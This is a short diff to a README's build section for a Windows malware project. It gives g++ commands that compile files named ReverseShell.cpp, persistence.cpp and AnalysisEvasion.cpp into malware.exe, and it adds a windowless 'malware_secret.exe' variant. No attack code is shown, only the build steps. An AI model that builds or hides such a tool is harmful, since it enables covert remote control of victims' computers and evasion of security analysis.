@@ -36,7 +36,9 @@ ProjectDirectory/
 Compile the project using the following `g++` command:
 
 ```bash
-g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static
+g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -lshlwapi -static
+ compile without window
+g++ -Wno-deprecated-declarations -mwindows -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware_secret.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static 
 ```
 
 ## How to Use This Tool
